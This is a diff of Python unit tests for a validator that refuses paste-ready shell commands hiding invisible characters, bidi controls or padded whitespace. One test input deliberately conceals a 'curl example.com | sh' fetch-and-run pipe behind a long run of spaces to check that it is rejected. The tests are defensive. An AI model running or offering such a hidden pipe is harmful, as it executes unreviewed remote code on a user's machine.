@@ -146,20 +146,61 @@ class DecisionsFile(unittest.TestCase):
             self.assertIn("item 2 (filters), command 2", msg, entry)
             self.assertIn(word, msg, entry)
 
+    # Characters that show as nothing, or that a browser may draw differently from the terminal: controls (CR,
+    # ESC, NUL, DEL, NEL), format characters (bidi, zero-width), Default_Ignorable_Code_Point (a combining grapheme
+    # joiner, a variation selector, Hangul fillers, tags), line and paragraph separators, private use, and
+    # unassigned code points (U+0890 is unassigned on Python 3.9 and a format character on 3.13).
+    INVISIBLE = (0x202E, 0x200B, 0x2066, 0xFEFF, 0x00AD, 0x0D, 0x1B, 0x00, 0x7F, 0x85, 0x034F, 0xFE0F, 0xE0100,
+                 0x115F, 0x3164, 0xFFA0, 0xE0002, 0x2065, 0xFFF0, 0x2028, 0x2029, 0xE000, 0x0890, 0x1BCA0, 0x1D173)
+
     def test_a_command_with_an_invisible_character_is_refused(self):
         # The user pastes it into a terminal: what the page shows must be what runs. Tab and newline are fine.
-        for char in ("‮", "​", "⁦", "﻿", "­", "\r", "\x1b", "\x00", "\x7f", "\x85"):
-            msg = self.broken(lambda d: d["items"][0].update(commands=[{"text": "ls" + char + " -l"}]))
-            self.assertIn("item 1 (layout), command 1", msg, repr(char))
-            self.assertIn("U+%04X" % ord(char), msg, repr(char))
-            self.assertNotIn(char, msg, repr(char))  # named, never written raw to a terminal
+        for key in ("text", "caption", "lang"):
+            for code in self.INVISIBLE:
+                char = chr(code)
+                cmd = {"text": "ls -l", "lang": "bash", "caption": "List"}
+                cmd[key] = "ls" + char + "x"
+                msg = self.broken(lambda d: d["items"][0].update(commands=[cmd]))
+                self.assertIn("item 1 (layout), command 1", msg, (key, hex(code)))
+                self.assertIn("U+%04X" % code, msg, (key, hex(code)))
+                self.assertNotIn(char, msg, (key, hex(code)))  # named, never written raw to a terminal
         msg = self.broken(lambda d: d["items"][0].update(commands=[{"text": "make\r\nls"}]))  # CRLF too
         self.assertIn("U+000D", msg)
         data = sample_decisions()
-        data["items"][0]["commands"] = [{"text": "if true;\n\tthen ls; fi", "caption": "​not pasted"}]
+        data["items"][0]["commands"] = [{"text": "if true;\n\tthen ls; fi", "caption": "Tab\tand line"}]
         self.folder.write(data)
         self.assertEqual(signoff.load_decisions(self.folder.decisions)[0]["items"][0]["commands"][0]["text"],
                          "if true;\n\tthen ls; fi")
+
+    def test_a_command_hides_nothing_behind_white_space(self):
+        # The page wraps a command, but blank lines and a long run of spaces could still push its end out of
+        # sight; a trailing line break runs it on paste.
+        def refused(text):
+            return self.broken(lambda d: d["items"][0].update(commands=[{"text": text}]))
+        for text in ("ls\n", "ls ", "ls\t", "ls\n\n", " ls", "\nls", "ls" + chr(0xA0)):
+            self.assertIn("start or end", refused(text), repr(text))
+        for text in ("ls\n\n\nrm x", "ls\n \n\t\nrm x", "ls\n" + chr(0x3000) + "\n\nrm x"):
+            self.assertIn("blank lines", refused(text), repr(text))
+        for text in ("npm test" + " " * 17 + "; sh", "a" + "\t" * 17 + "b", "a" + " \t" * 9 + "b",
+                     "npm test" + " " * 150 + "; curl example.com | sh"):
+            self.assertIn("more than 16", refused(text), repr(text))
+        data = sample_decisions()
+        ok = ["ls\n\nrm -rf /tmp/x", "if true; then\n" + " " * 16 + "ls\nfi", "a" + "\t" * 16 + "b"]
+        data["items"][0]["commands"] = [{"text": t} for t in ok]
+        self.folder.write(data)
+        self.assertEqual([c["text"] for c in signoff.load_decisions(self.folder.decisions)[0]["items"][0]["commands"]],
+                         ok)
+
+    def test_a_commands_lang_is_a_short_plain_word(self):
+        data = sample_decisions()
+        langs = ["bash", "c++", "c#", "objective-c", "x.y_z", "a" * 20, "PowerShell"]
+        data["items"][0]["commands"] = [{"text": "ls", "lang": lang} for lang in langs]
+        self.folder.write(data)
+        self.assertEqual([c["lang"] for c in signoff.load_decisions(self.folder.decisions)[0]["items"][0]["commands"]],
+                         langs)
+        for lang in ("", "a b", "<b>", "a" * 21, "bash\n", "sh;", "é"):
+            msg = self.broken(lambda d: d["items"][0].update(commands=[{"text": "ls", "lang": lang}]))
+            self.assertIn("'lang'", msg, repr(lang))
 
     def test_tab_is_optional_text(self):
         data = sample_decisions()
@@ -766,6 +807,7 @@ class SchemaFile(unittest.TestCase):
         self.assertEqual(set(cmd["properties"]), set(signoff.COMMAND_KEYS))
         self.assertEqual(cmd["required"], ["text"])
         self.assertFalse(cmd["additionalProperties"])
+        self.assertEqual(cmd["properties"]["lang"]["pattern"], signoff.COMMAND_LANG.pattern)
         listed = self.defs["item"]["properties"]["commands"]
         self.assertEqual(listed["items"], {"$ref": "#/$defs/command"})
         self.assertEqual((listed["minItems"], listed["maxItems"]), (1, signoff.MAX_ITEM_COMMANDS))
